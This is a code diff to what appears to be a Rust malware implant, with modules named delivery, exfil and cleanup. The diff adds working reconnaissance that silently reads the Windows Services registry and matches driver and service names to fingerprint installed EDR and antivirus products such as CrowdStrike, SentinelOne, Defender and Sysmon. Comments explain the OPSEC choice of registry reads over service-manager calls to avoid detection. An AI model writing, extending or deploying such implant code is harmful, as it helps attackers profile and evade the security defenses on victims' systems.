@@ -26,7 +26,7 @@ pub mod scanners;
 
 pub mod delivery;
 
-use crate::heap::{String, Vec};
+use crate::heap::{vec, String, Vec};
 use core::ffi::c_void;
 pub mod cleanup;
 pub mod exfil;
@@ -169,11 +169,17 @@ pub struct KernelPosture {
 /// queries `root\SecurityCenter2:AntiVirusProduct` via hand-rolled COM (the
 /// `wmi`/`windows` crates are out — implant is no_std PIC), and
 /// `wmi_query_services`/`wmi_query_drivers` query `root\CIMV2`. T1 (registry)
-/// is still a stub. Mitigation queries (CFG/CET/DEP/ASLR) are also live.
+/// landed 2026-07-18: `scan_service_registry` walks
+/// `HKLM\SYSTEM\CurrentControlSet\Services` via the ANSI advapi32 entrypoints
+/// (RegOpenKeyExA/RegEnumKeyExA/RegQueryValueExA) — silent registry reads, no
+/// SCM RPC. `wmi_query_drivers` now uses the dedicated `match_driver_name`
+/// matcher (kernel-driver naming space) instead of the service-name DB.
+/// Mitigation queries (CFG/CET/DEP/ASLR) are also live.
 ///
 /// `assess_user_mode` will correctly detect EDR/AV products via process names,
-/// service names from the SCM, and WMI-registered AV products. The Tier will
-/// be accurate — no more UNIMPLEMENTED banner.
+/// service names from the SCM, registry DisplayName/ImagePath values, and WMI-
+/// registered AV products. The Tier will be accurate — no more UNIMPLEMENTED
+/// banner.
 const TREX_SCANNERS_IMPLEMENTED: bool = true;
 
 /// Run a full T0-T3 assessment (no kernel driver needed).
@@ -308,20 +314,24 @@ unsafe fn scan_service_registry(assessment: &mut TargetAssessment) {
 
     let mut index: u32 = 0;
     loop {
-        let mut name_buf = [0u16; 256];
+        // RegEnumKeyExA writes ASCII subkey names. The buffer is reused across
+        // iterations; we trust the API to NUL-terminate within `name_len`.
+        let mut name_buf = [0u8; 256];
         let mut name_len = name_buf.len() as u32;
-        let st = reg_enum_key(key, index, name_buf.as_mut_ptr(), &mut name_len);
-        if st != 0 {
+        let st = reg_enum_key(key, index, name_buf.as_mut_ptr() as *mut u16, &mut name_len);
+        if st != scanners::ERROR_SUCCESS {
             break;
         }
+        // ERROR_SUCCESS implies at least one byte; defensively bound the slice.
+        let actual = (name_len as usize).min(name_buf.len());
+        let subkey_name = ascii_slice_to_string(&name_buf[..actual]);
 
-        let subkey_name = wide_slice_to_utf8(&name_buf[..name_len as usize]);
         let subkey = open_registry_subkey(key, &subkey_name);
         if !subkey.is_null() {
             // Read DisplayName + ImagePath
             let display = query_reg_value(subkey, b"DisplayName");
             let image = query_reg_value(subkey, b"ImagePath");
-            if let Some(vendor) = match_service_pattern(display, image) {
+            if let Some(vendor) = match_service_pattern(&display, &image) {
                 let product = DetectedProduct {
                     vendor,
                     product_name: vendor.default_name(),
@@ -962,6 +972,99 @@ fn match_service_pattern(display: &str, image: &str) -> Option<Vendor> {
     match_service_name(display).or_else(|| match_process_name(image))
 }
 
+/// Match a Windows kernel driver name → vendor.
+///
+/// Split off from `match_service_name` because drivers and services use
+/// different naming conventions and the service substring set produces both
+/// false positives (e.g. service-substring `"sense"` matches the unrelated
+/// `Sensor servo` driver, `"sep"` matches any `*.sep` inf) and false negatives
+/// (real EDR drivers use the kernel-driver naming space: `.sys` suffix, vendor
+/// prefixes absent from the service list). See `is_edr_driver` for the
+/// byte-level matcher used by the T4 kernel module enumerator — this function
+/// is the string-level twin used by the T2 WMI `Win32_SystemDriver` query.
+///
+/// Rules (informed by 2026 EDR driver naming, see EDRSandblast / eSentire
+/// Surveyor driver name lists):
+///   - CrowdStrike: `csagent`, `csdevice` (the Falcon sensor + filter driver)
+///   - SentinelOne: `sentinel` + (`monitor`|`visor`), or the `sqm`-style
+///     `sentinelone` prefix
+///   - Defender ATP: `wdfilter`, `windefend` (the kernel anti-malware engine +
+///     minifilter; `wdnisdrv` is the network inspection driver)
+///   - Carbon Black: `cbfs`, `carbon`, `cbknc` (Cb Defense file-system filter)
+///   - Elastic: `elastic` + (`defend`|`endpoint`)
+///   - Cortex XDR: `cortex`, `traps` (the Traps-era kernel driver names)
+///   - Sophos: `sophos` + (`bp`|`boot`|`eld`|`spt`) — the Sophos kernel drivers
+///   - Kaspersky: `klif`, `klam`, `klick`, `kltdi` (the KL* driver family)
+///   - McAfee: `mfe`*, `mfenc` (Heartbeat / Encrypted firewall drivers)
+///   - Symantec: `symefa`, `symevnt`, `symcorpu`, `srtsp` (SONAR / EFA drivers)
+///   - ESET: `eamonm`, `ehdrv`, `epfw`, `epfwwfp` (ESET kernel drivers)
+///   - Bitdefender: `bdvedisk`, `trufos`, `bdfndlf` (the Trufos / filesystem
+///     filter drivers)
+///   - Sysmon: `sysmondrv` (Sysmon's kernel data-provider driver)
+///   - Trend Micro: `tmact`, `tmebc`, `tmbmsrv` (the OfficeScan/Apex drivers)
+///
+/// Substrings are deliberately vendor-specific (multi-token where a single
+/// token like `mfe` would over-match) so a generic Windows driver like
+/// `tcpip.sys` or `ntfs.sys` never matches. The `.sys` suffix itself is NOT
+/// used as a token — every kernel driver has it.
+fn match_driver_name(name: &str) -> Option<Vendor> {
+    let lower = name.to_lowercase();
+    if lower.contains("csagent") || lower.contains("csdevice") {
+        return Some(Vendor::CrowdStrike);
+    }
+    if lower.contains("sentinelone")
+        || (lower.contains("sentinel") && (lower.contains("monitor") || lower.contains("visor")))
+    {
+        return Some(Vendor::SentinelOne);
+    }
+    if lower.contains("wdfilter") || lower.contains("windefend") || lower.contains("wdnisdrv") {
+        return Some(Vendor::MicrosoftDefenderATP);
+    }
+    if lower.contains("cbfs") || lower.contains("carbon") || lower.contains("cbknc") {
+        return Some(Vendor::CarbonBlack);
+    }
+    if lower.contains("elastic") && (lower.contains("defend") || lower.contains("endpoint")) {
+        return Some(Vendor::ElasticEDR);
+    }
+    if lower.contains("cortex") || lower.contains("traps") {
+        return Some(Vendor::CortexXDR);
+    }
+    if lower.contains("sophos")
+        && (lower.contains("bp")
+            || lower.contains("boot")
+            || lower.contains("eld")
+            || lower.contains("spt"))
+    {
+        return Some(Vendor::SophosInterceptX);
+    }
+    if lower.contains("klif") || lower.contains("klam") || lower.contains("klick")
+        || lower.contains("kltdi")
+    {
+        return Some(Vendor::Kaspersky);
+    }
+    if lower.contains("mfenc") || lower.contains("mfeh") || lower.contains("mfefirek") {
+        return Some(Vendor::McAfee);
+    }
+    if lower.contains("symefa") || lower.contains("symevnt") || lower.contains("symcorpu")
+        || lower.contains("srtsp")
+    {
+        return Some(Vendor::Symantec);
+    }
+    if lower.contains("eamonm") || lower.contains("ehdrv") || lower.contains("epfw") {
+        return Some(Vendor::ESET);
+    }
+    if lower.contains("bdvedisk") || lower.contains("trufos") || lower.contains("bdfndlf") {
+        return Some(Vendor::Bitdefender);
+    }
+    if lower.contains("tmact") || lower.contains("tmebc") || lower.contains("tmbmsrv") {
+        return Some(Vendor::TrendMicroApex);
+    }
+    if lower.contains("sysmondrv") {
+        return Some(Vendor::Sysmon);
+    }
+    None
+}
+
 fn is_edr_driver(name: &[u8]) -> bool {
     // EDR kernel driver names (2026)
     let name_lower: Vec<u8> = name.iter().map(|b| b.to_ascii_lowercase()).collect();
@@ -1086,6 +1189,24 @@ unsafe fn wide_slice_to_utf8(w: &[u16]) -> String {
 unsafe fn wide_to_utf8(w: *const u16) -> String {
     scanners::wide_to_utf8(w)
 }
+/// Convert an ASCII byte slice (from the Reg*A entrypoints) to an owned String.
+/// Stops at the first NUL (registry names are NUL-terminated); bytes ≥ 0x80
+/// become '?' (registry subkey names are ASCII by SCM rule, so this only fires
+/// on a corrupted key — we never panic).
+unsafe fn ascii_slice_to_string(b: &[u8]) -> String {
+    let mut s = String::with_capacity(b.len());
+    for &c in b {
+        if c == 0 {
+            break;
+        }
+        if c < 0x80 {
+            s.push(c as char);
+        } else {
+            s.push('?');
+        }
+    }
+    s
+}
 
 unsafe fn get_process_mitigation_policy(
     h: *mut core::ffi::c_void,
@@ -1103,20 +1224,168 @@ fn free(p: *mut u8) {
     unsafe { scanners::free(p) }
 }
 
-// ---- T1/T2 stubs (registry + WMI — deferred to next phase) -----------------
+// ---- T1: Registry enumeration (real implementation) -----------------------
+//
+// Backs scan_service_registry. We use the advapi32 Reg*A (ANSI) entrypoints
+// resolved in scanners.rs — service-name subkeys and the DisplayName/ImagePath
+// values are all ASCII, so the -W widen would be pure overhead. See the
+// scanners.rs T1 block for the OPSEC rationale (registry reads vs. SCM RPC).
+//
+// `HKey` is an opaque `usize` (a real HKEY from RegOpenKeyExA, never the
+// predefined-handle sentinels — callers must open HKLM\...\Services first).
+// `null_mut` is the failure sentinel throughout.
 
-unsafe fn open_registry_key(_path: &[u8]) -> HKey {
-    core::ptr::null_mut() // TODO: wire to scanners::reg_open_key
+unsafe fn open_registry_key(path: &[u8]) -> HKey {
+    // NUL-terminate the ASCII subkey path on the stack. MAX_PATH (260) covers
+    // every Services-tree path we open.
+    let mut buf = [0u8; 260];
+    let n = path.len().min(buf.len() - 1);
+    buf[..n].copy_from_slice(&path[..n]);
+    let mut h: usize = 0;
+    let st = scanners::reg_open_key_ex_a(
+        scanners::HKEY_LOCAL_MACHINE,
+        buf.as_ptr(),
+        0,
+        scanners::KEY_READ,
+        &mut h,
+    );
+    if st != scanners::ERROR_SUCCESS || h == 0 {
+        return core::ptr::null_mut();
+    }
+    h as HKey
 }
-unsafe fn open_registry_subkey(_parent: HKey, _name: &str) -> HKey {
-    core::ptr::null_mut()
+
+unsafe fn open_registry_subkey(parent: HKey, name: &str) -> HKey {
+    // Same NUL-terminate dance for the subkey name (service name, ASCII).
+    let mut buf = [0u8; 260];
+    let bytes = name.as_bytes();
+    let n = bytes.len().min(buf.len() - 1);
+    buf[..n].copy_from_slice(&bytes[..n]);
+    let mut h: usize = 0;
+    let st = scanners::reg_open_key_ex_a(
+        parent as usize,
+        buf.as_ptr(),
+        0,
+        scanners::KEY_READ,
+        &mut h,
+    );
+    if st != scanners::ERROR_SUCCESS || h == 0 {
+        return core::ptr::null_mut();
+    }
+    h as HKey
 }
-unsafe fn close_registry_key(_k: HKey) {}
-unsafe fn reg_enum_key(_k: HKey, _idx: u32, _name: *mut u16, _len: *mut u32) -> i32 {
-    -1
+
+unsafe fn close_registry_key(k: HKey) {
+    if k.is_null() {
+        return;
+    }
+    scanners::reg_close_key(k as usize);
 }
-unsafe fn query_reg_value(_k: HKey, _name: &[u8]) -> &str {
-    ""
+
+/// Enumerate one subkey name per call. `name` is an ASCII byte buffer the
+/// caller owns; `len` is in/out (caller passes capacity, callee writes actual
+/// length excluding NUL). Returns ERROR_SUCCESS (0) on success,
+/// ERROR_NO_MORE_ITEMS (259) past the end, or another win32 error.
+unsafe fn reg_enum_key(k: HKey, idx: u32, name: *mut u16, len: *mut u32) -> i32 {
+    // Callers pass a u16 buffer for legacy reasons (the original -W design);
+    // we cast to u8 since RegEnumKeyExA writes ASCII bytes into the same
+    // memory. The capacity in bytes == the capacity in u16 units × 2, which is
+    // strictly larger, so the write is in-bounds.
+    if k.is_null() {
+        return -1;
+    }
+    // RegEnumKeyExA counts in chars (bytes), not including the trailing NUL.
+    // The caller's u16-capacity is bytes/2; keep it as-is so a 256-u16 buffer
+    // reports 256 (the API will only ever write 255 chars + NUL anyway).
+    scanners::reg_enum_key_ex_a(
+        k as usize,
+        idx,
+        name as *mut u8,
+        len,
+        core::ptr::null_mut(),
+        core::ptr::null_mut(),
+        core::ptr::null_mut(),
+        core::ptr::null_mut(),
+    )
+}
+
+/// Read a `REG_SZ`/`REG_EXPAND_SZ` value as an owned ASCII String. Returns an
+/// empty String if the value is missing or the type is not a string. We do NOT
+/// expand %VAR% references (REG_EXPAND_SZ) — the matcher runs on substrings,
+/// and the unexpanded form is still a reliable EDR fingerprint.
+unsafe fn query_reg_value(k: HKey, name: &[u8]) -> String {
+    if k.is_null() {
+        return String::new();
+    }
+    let mut value_name = [0u8; 64];
+    let n = name.len().min(value_name.len() - 1);
+    value_name[..n].copy_from_slice(&name[..n]);
+
+    // Two-pass: first query for the byte length, then allocate + read.
+    let mut typ: u32 = 0;
+    let mut len: u32 = 0;
+    let st = scanners::reg_query_value_ex_a(
+        k as usize,
+        value_name.as_ptr(),
+        core::ptr::null_mut(),
+        &mut typ,
+        core::ptr::null_mut(),
+        &mut len,
+    );
+    if st != scanners::ERROR_SUCCESS || len == 0 {
+        return String::new();
+    }
+    if typ != scanners::REG_SZ && typ != scanners::REG_EXPAND_SZ {
+        return String::new();
+    }
+
+    // Cap the allocation — a runaway length would be a registry corruption / API
+    // misuse signal, not a real DisplayName. 8 KiB is well past MAX_PATH*2.
+    let cap = (len as usize).min(8192);
+    let mut buf = vec![0u8; cap + 1];
+    let mut len2: u32 = (cap + 1) as u32;
+    let st = scanners::reg_query_value_ex_a(
+        k as usize,
+        value_name.as_ptr(),
+        core::ptr::null_mut(),
+        &mut typ,
+        buf.as_mut_ptr(),
+        &mut len2,
+    );
+    if st != scanners::ERROR_SUCCESS {
+        return String::new();
+    }
+    // Trim trailing NUL(s) (REG_SZ is NUL-terminated; some writers emit extras).
+    let mut end = (len2 as usize).min(cap);
+    while end > 0 && buf[end - 1] == 0 {
+        end -= 1;
+    }
+    // Lossy ASCII→String: service display/image paths are ASCII, but be
+    // defensive — invalid UTF-8 becomes U+FFFD rather than panicking.
+    match core::str::from_utf8(&buf[..end]) {
+        Ok(s) => s.into(),
+        Err(_) => {
+            let mut out = String::with_capacity(end);
+            let mut i = 0;
+            while i < end {
+                match core::str::from_utf8(&buf[i..end]) {
+                    Ok(s) => {
+                        out.push_str(s);
+                        break;
+                    }
+                    Err(e) => {
+                        let v = e.valid_up_to();
+                        if v > 0 {
+                            out.push_str(core::str::from_utf8(&buf[i..i + v]).unwrap());
+                        }
+                        out.push('\u{FFFD}');
+                        i += v + 1;
+                    }
+                }
+            }
+            out
+        }
+    }
 }
 
 // ---- T2: WMI queries (real implementation) ---------------------------------
@@ -1402,12 +1671,14 @@ unsafe fn wmi_query_drivers(a: &mut TargetAssessment) {
         b"SELECT Name FROM Win32_SystemDriver WHERE State='Running'",
         b"Name",
     );
-    // No dedicated driver-name matcher exists in the vendor DB yet — reuse
-    // match_service_name (driver names like "csagent"/"SysmonDrv" match the
-    // same substrings). TODO: split match_service_name into match_driver_name
-    // once a driver-specific pattern set lands.
+    // Driver names follow the kernel-driver naming space (vendor prefixes +
+    // .sys suffix, e.g. csagent.sys / SysmonDrv / Wdfilter), which differs from
+    // service names. match_driver_name encodes the driver-specific pattern set
+    // — reusing match_service_name here both missed real drivers (no "wdfilter"
+    // token in the service DB) and false-matched benign ones (the service
+    // substring "sep" hits any *.sep inf).
     for name in names.iter() {
-        if let Some(vendor) = match_service_name(name.as_str()) {
+        if let Some(vendor) = match_driver_name(name.as_str()) {
             let product = DetectedProduct {
                 vendor,
                 product_name: vendor.default_name(),
